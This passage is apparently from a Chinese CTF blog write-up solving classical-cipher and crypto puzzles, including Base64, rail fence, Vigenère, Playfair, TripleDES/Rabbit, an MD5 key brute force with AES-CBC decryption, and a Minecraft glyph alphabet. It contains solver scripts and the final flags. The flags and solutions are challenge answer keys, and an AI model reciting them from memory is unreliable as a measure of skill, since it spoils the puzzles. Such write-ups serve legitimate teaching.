<span class="string">&quot;res.txt&quot;</span>;</span><br><span class="line"><span class="built_in">analys</span>(<span class="built_in">f_open</span>(txt));</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;输⼊0退出，其它值返回继续操作：&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; op;</span><br><span class="line"><span class="keyword">if</span> (op == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="图片怎么你了？"><a href="#图片怎么你了？" class="headerlink" title="图片怎么你了？"></a>图片怎么你了？</h2><p>对图片进行了BASE64加密，网上找图片BASE64解密⽹站即可还原<br>这里给出加密解密python源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment"># Base64编解码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64en</span>(<span class="params">path_in, path_out</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path_in, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fileObj:</span><br><span class="line">        image_data = fileObj.read()</span><br><span class="line">        base64_data = base64.b64encode(image_data)</span><br><span class="line">        fout = <span class="built_in">open</span>(path_out, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        fout.write(base64_data.decode())</span><br><span class="line">        fout.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">b64de</span>(<span class="params">path_in, path_out</span>):</span><br><span class="line">    b64_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    <span class="comment"># 读取需要解码的⽂本⽂件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path_in, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> text_file:</span><br><span class="line">        encoded_string = text_file.read()</span><br><span class="line">    <span class="comment"># 去除⽆效字符和换⾏符</span></span><br><span class="line">    encoded_string = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">filter</span>(<span class="keyword">lambda</span> c: c <span class="keyword">in</span> b64_table, </span><br><span class="line">encoded_string)).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># 将Base64编码字符串转换为字节串</span></span><br><span class="line">    encoded_bytes = <span class="built_in">bytes</span>(encoded_string, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 初始化解码后的字节串和计数器</span></span><br><span class="line">    decoded_bytes = <span class="built_in">bytearray</span>()</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 逐个解码Base64字符</span></span><br><span class="line">    <span class="keyword">for</span> b64_char <span class="keyword">in</span> encoded_bytes:</span><br><span class="line">        <span class="comment"># 计算Base64字符在字符表中的索引</span></span><br><span class="line">        index = b64_table.index(<span class="built_in">chr</span>(b64_char))</span><br><span class="line">        <span class="comment"># 根据计数器的值，将16位的⼆进制数填⼊32位的缓冲区中</span></span><br><span class="line">        <span class="keyword">if</span> cnt == <span class="number">0</span>:</span><br><span class="line">            buffer = index &lt;&lt; <span class="number">2</span></span><br><span class="line">            cnt = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> cnt == <span class="number">1</span>:</span><br><span class="line">            buffer |= (index &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x03</span></span><br><span class="line">            decoded_bytes.append(buffer)</span><br><span class="line">            buffer = (index &amp; <span class="number">0x0f</span>) &lt;&lt; <span class="number">4</span></span><br><span class="line">            cnt = <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> cnt == <span class="number">2</span>:</span><br><span class="line">            buffer |= (index &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x0f</span></span><br><span class="line">            decoded_bytes.append(buffer)</span><br><span class="line">            buffer = (index &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">6</span></span><br><span class="line">            cnt = <span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            buffer |= index</span><br><span class="line">            decoded_bytes.append(buffer)</span><br><span class="line">            cnt = <span class="number">0</span></span><br><span class="line">    <span class="comment">#print(decoded_bytes)</span></span><br><span class="line">    <span class="comment"># 将解码后的字节串写⼊图⽚⽂件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path_out, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> image_file:</span><br><span class="line">        image_file.write(decoded_bytes)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    b64en(<span class="string">&quot;pic.jpg&quot;</span>, <span class="string">&quot;pic&quot;</span>)</span><br><span class="line">    b64de(<span class="string">&quot;pic&quot;</span>, <span class="string">&quot;de_pic.jpg&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="呜呜呜"><a href="#呜呜呜" class="headerlink" title="呜呜呜"></a>呜呜呜</h2><p>先社会主义核⼼价值观编码再栅栏密码w型。因为社会主义核⼼价值观每4个词⼀组，因此栅栏也是4为栏数。最终得到<br>flag{E1nC0o4d1n2g_1d4s_f2U3n_so_a4s_F3nc3}</p><h2 id="ez-explode"><a href="#ez-explode" class="headerlink" title="ez-explode"></a>ez-explode</h2><p>按照给出的代码枚举k和r爆破即可，下⾯给出爆破代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> <span class="keyword">import</span> re</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">grid_decrypt</span>(<span class="params">encrypted_message</span>):</span><br><span class="line">    decrypted_message = <span class="string">&quot;&quot;</span></span><br><span class="line">    length = <span class="built_in">len</span>(encrypted_message)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> i != length-<span class="number">1</span>:</span><br><span class="line">            decrypted_message += encrypted_message[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            decrypted_message += encrypted_message[i]</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">2</span>:</span><br><span class="line">        decrypted_message += encrypted_message[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> decrypted_message</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">decrypt_message</span>(<span class="params">encrypted_message, r, k</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">        encrypted_message = encrypted_message[-<span class="number">1</span>] + encrypted_message[:-<span class="number">1</span>]</span><br><span class="line">        encrypted_message = grid_decrypt(encrypted_message)</span><br><span class="line">    replace_message = <span class="string">r&#x27;[#$&amp;()\[\]&lt;&gt;?!%^@+=]&#x27;</span></span><br><span class="line">    encrypted_message = re.sub(replace_message, <span class="string">&#x27;&#x27;</span>, encrypted_message)</span><br><span class="line"></span><br><span class="line">    plain_message = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> encrypted_message:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">            plain_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - k - <span class="number">97</span> + <span class="number">26</span>) % <span class="number">26</span>) + <span class="number">97</span>)</span><br><span class="line">            plain_message += plain_char</span><br><span class="line">        <span class="keyword">elif</span> char <span class="keyword">in</span> string.ascii_uppercase:</span><br><span class="line">            plain_char = <span class="built_in">chr</span>(((<span class="built_in">ord</span>(char) - k - <span class="number">65</span> + <span class="number">26</span>) % <span class="number">26</span>) + <span class="number">65</span>)</span><br><span class="line">            plain_message += plain_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plain_message += char</span><br><span class="line">    <span class="keyword">return</span> plain_message</span><br><span class="line"> encrypted_message = <span class="string">&quot;1$0Osdy__s_&lt;mp6H1&#123;Jf5V@SE0+pY6_=!Hwv06w0V7&#125;xk&quot;</span></span><br><span class="line"> <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">20</span>):</span><br><span class="line">        decrypted_message = decrypt_message(encrypted_message, r, k)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> decrypted_message:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;r=<span class="subst">&#123;r&#125;</span>,k=<span class="subst">&#123;k&#125;</span>,: <span class="subst">&#123;decrypted_message&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="AES？"><a href="#AES？" class="headerlink" title="AES？"></a>AES？</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># md5爆破key：</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> str1 = <span class="string">&quot;d567b916876527&quot;</span></span><br><span class="line"> str2 = <span class="string">&quot;891b14d536be997e8d5&quot;</span></span><br><span class="line"> str3 = <span class="string">&quot;7b916876527d8&quot;</span></span><br><span class="line"> str4 = <span class="string">&quot;1b14d536b&quot;</span></span><br><span class="line"> str5 = <span class="string">&quot;997e8&quot;</span></span><br><span class="line"> <span class="comment"># 将所有可打印字符存⼊数组 , ⽤于遍历所有字符</span></span><br><span class="line">res = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;~ &#x27;</span>]</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">getMd5</span>(<span class="params">plaintext</span>):</span><br><span class="line">    md5Object = hashlib.md5()</span><br><span class="line">    md5Object.update(plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> md5Object.hexdigest()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> res:</span><br><span class="line">                plaintext = str1 + i + str2 + j + str3 + k + str4 + l + str5</span><br><span class="line"> <span class="comment"># 拼接明⽂字符串</span></span><br><span class="line">                md5 = getMd5(plaintext)</span><br><span class="line"> <span class="comment"># 判断是否成功</span></span><br><span class="line">                <span class="keyword">if</span> md5.startswith(<span class="string">&quot;0e79216&quot;</span>) <span class="keyword">and</span> md5.endswith(<span class="string">&quot;0948&quot;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Success! The plaintext is:&quot;</span>, plaintext)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;No match found.&quot;</span>)</span><br><span class="line"> <span class="comment">#因为四层循环，需要等待⼀⼩段时间才能运⾏出来结果</span></span><br><span class="line"> <span class="comment">#Success! The plaintext is:</span></span><br><span class="line"> d567b916876527d891b14d536be997e8d567b916876527d891b14d536be997e8</span><br></pre></td></tr></table></figure><p>观察给出的代码发现iv是32字节，并且被分成两部分，前半部分是base85，后半部分是base32对应<br>解码即可：</p><p><code>iv:33a4235ea4d294c113c5ff98447c927a</code></p><p>最终解密python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_bytes</span>(<span class="params">length</span>):</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">bytes</span>([random.randint(<span class="number">0</span>, <span class="number">255</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length)])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">   enc_flag =</span><br><span class="line"><span class="string">b&quot;\x189\xdb\x11t\xb8\xc5\xe8\xe5\xa8n\x04&#x27;XH\x13\x9c9\xe8\x88\x0c&gt;\xe7\xde\t\xa0\xad\x7f\xb4u\x1f\xc1&quot;</span></span><br><span class="line">   hex_key_str =<span class="string">&quot;d567b916876527d891b14d536be997e8d567b916876527d891b14d536be997e8&quot;</span></span><br><span class="line">   hex_iv_str = <span class="string">&quot;33a4235ea4d294c113c5ff98447c927a&quot;</span></span><br><span class="line">   key = <span class="built_in">bytes</span>.fromhex(hex_key_str)</span><br><span class="line">   iv = <span class="built_in">bytes</span>.fromhex(hex_iv_str)</span><br><span class="line">   aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">   <span class="built_in">print</span>(aes.decrypt(enc_flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   main()</span><br><span class="line"><span class="comment"># flag&#123;O.o_y0u_can_so1v3_AES_now!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="低头看看手机和电脑？"><a href="#低头看看手机和电脑？" class="headerlink" title="低头看看手机和电脑？"></a>低头看看手机和电脑？</h2><p>根据题目和A、B很明显的键盘密码，其中A是26键（两种不同形式），B是9键可知B为key,A为virginia，又提示密文是经过维吉尼亚密码进行加密而且密钥也给出了，也就是&#96;virginia 解密即可<br> flag{Congratulations!You already know the keyboard and the Virginia!}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.键盘密码(Keyboard Cipher)特征/特点：利⽤键盘的特性制作的密码，常见有计算机的键盘和⼿机的键盘，加密的⽅式有坐标法和顺序法。 </span><br><span class="line">1)坐标法：</span><br><span class="line">Y轴:1 QWE RTY UIOP 2 ASD FGH JKL 3 ZXC VBN M </span><br><span class="line">X轴:12345678910 </span><br><span class="line">eq：密文：2251914161 对应明文：story</span><br><span class="line">2)顺序法：Q W E R T Y U I O P 1 2 3 4 5 6 7 8 9 10 A S D F G H J K L 11 12 13 14 15 </span><br><span class="line">16 17 18 19 Z X C V B N M 20 21 22 23 24 25 26 </span><br><span class="line">eq：密⽂：125947对应明⽂：story</span><br><span class="line">2.手机九宫格键盘密码特征特点：密⽂⽤数字0-9表示a-z的字符集字母不区分大小写 </span><br><span class="line">密文：21222331323341424351525361626371727381828391929394 </span><br><span class="line">明文：abcdefghijklmnopqrtuvwxyz </span><br><span class="line">3.维吉尼亚密码(Vigenère Cipher)特征特点：维吉尼亚密码(Vigenère Cipher)是在单⼀恺撒密码的基础上扩展出多表代换密码，根据密钥(当密钥长度⼩于明文长度时可以循环使⽤)来决定用哪一行的密表来进行替换，以此来对抗字频统计 </span><br></pre></td></tr></table></figure><h2 id="网安导论"><a href="#网安导论" class="headerlink" title="网安导论"></a>网安导论</h2><p>由甲中 自田井 羊夫 白中由 甲口只 羊目大 由由工<br>即：112 108 97 121 102 97 105 114<br>所以密钥为：playfair<br>密⽂为：qbqglqzvkudnbponbpsubpoeqkpqkv<br>提示：⽹络空间安全导论49⻚<br>多字母表加密，解密后为haohaoxuexitiantianxiangshang<br>明文：flag{haohaoxuexitiantianxiangshang}<br>密文：qbqglqzvkudnbponbpsubpoeqkpqkv，<br>密钥：playfair</p><h2 id="快放假了！"><a href="#快放假了！" class="headerlink" title="快放假了！"></a>快放假了！</h2><p>U2FsdGVkX1&#x2F;U2UwcHyXnjLegIHgW5URBEVgJy9UMQzY3JkqcP2RFhVEiiY&#x2F;tcKA3<br>YDKBB40VqThG5&#x2F;N2FYaG6hODhSGbjHoDpNIoWpoCQfk&#x3D;<br>TripleDes解密，密钥为0929<br>解密得：U2FsdGVkX1&#x2F;mh3nQv5sGKvD7jJh5bA+byb518k5onGHuBfzyoBF2DA&#x3D;&#x3D;<br>rabbit解密，密钥为1001<br>解密得：flag{Happy-National-Day}</p><h2 id="Good-man"><a href="#Good-man" class="headerlink" title="Good man"></a>Good man</h2><p>本题是很简单的⼀个逆向类密码<br>加密代码的含义是将⼀个char类型的字符高低四位反转，例如：0x61会被高低4位反转，变成0x16</p><p>解密代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">//66 c6 16 76 b7 86 56 37 86 13 f5 13 37 f5 4 f5 76 3 3 46 f5 d6 4 e6 d7</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;    </span><br><span class="line">    <span class="type">int</span> miwen[<span class="number">25</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)</span><br><span class="line">    &#123;        </span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%x&quot;</span>,&amp;miwen[i]);   </span><br><span class="line">        <span class="type">int</span> h=miwen[i]%<span class="number">0x10</span>;</span><br><span class="line">        <span class="type">int</span> l=miwen[i]/<span class="number">0x10</span>;        </span><br><span class="line">        miwen[i]=h*<span class="number">0x10</span>+l;        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,miwen[i]);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，如果你能看懂代码，那么直接手动反转再去找ascii解码也是可以的。<br>flag{hesh1_1s@g00d_m@n}</p><h2 id="方块语言"><a href="#方块语言" class="headerlink" title="方块语言"></a>方块语言</h2><p>这种加密方式最多见于我的世界的附魔台，所以我称它为方块语言。<br>本题降低了难度，给了一个去掉了字母的密码表（实际上你自己按顺序加上就可以直接用了）<br>你可以利用图片搜索，也可以搜索和我的世界有关的语言（如果你知道这个游戏的话），在网上找到未被抹去字母的密码表。<br>再对密⽂进⾏处理，密文表面上由字符组成，其实不难看出，它构成的图案对应的是密码表中的图案。<br>最终对照密码表得到flag</p><p>出题代码(python)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">null=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 0 0 0 0 0 </span></span><br><span class="line"><span class="string">0 0 0 0 0 0</span></span><br><span class="line"><span class="string">0 0 0 0 0 0</span></span><br><span class="line"><span class="string">0 0 0 0 0 0</span></span><br><span class="line"><span class="string">0 0 0 0 0 0</span></span><br><span class="line"><span class="string">0 0 0 0 0 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">m=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 0 0 0 0 0</span></span><br><span class="line"><span class="string">0 1 0 0 0 1</span></span><br><span class="line"><span class="string">0 0 0 0 0 1</span></span><br><span class="line"><span class="string">0 0 0 0 0 1</span></span><br><span class="line"><span class="string">0 0 0 0 0 1</span></span><br><span class="line"><span class="string">0 1 1 1 1 1</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">c=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1 1 0 0 0 0 </span></span><br><span class="line"><span class="string">0 0 0 0 0 0</span></span><br><span class="line"><span class="string">1 1 0 0 0 0</span></span><br><span class="line"><span class="string">0 0 1 1 0 0</span></span><br><span class="line"><span class="string">0 0 1 